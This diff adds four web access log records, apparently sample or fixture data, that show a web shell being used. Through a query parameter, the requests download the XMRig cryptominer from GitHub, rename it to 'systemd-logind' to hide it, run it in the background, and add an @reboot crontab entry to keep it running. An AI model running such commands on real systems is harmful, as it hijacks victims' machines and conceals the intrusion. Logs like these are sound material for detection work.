@@ -1,0 +1,4 @@
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=cd%20/var/tmp%20%26%26%20wget%20--no-check-certificate%20https%3A//github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-linux-static-x64.tar.gz%20-O%20xmrig.tar.gz%202%3E%261", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=cd%20/var/tmp%20%26%26%20mv%20xmrig-%2A/xmrig%20systemd-logind%202%3E%261", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=cd%20/var/tmp%20%26%26%20nohup%20./systemd-logind%20-c%20config.json%20%3E/dev/null%202%3E%261%20%26", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
+{"c-ip": "138.124.123.107", "cs-method": "GET", "c-uri": "/olZCkl?z=%28crontab%20-l%3B%20echo%20%22%40reboot%20cd%20/var/tmp%20%26%26%20nohup%20./systemd-logind%20-c%20config.json%22%29%20%7C%20crontab%20-", "sc-status": 200, "c-useragent": "Mozilla/5.0"}
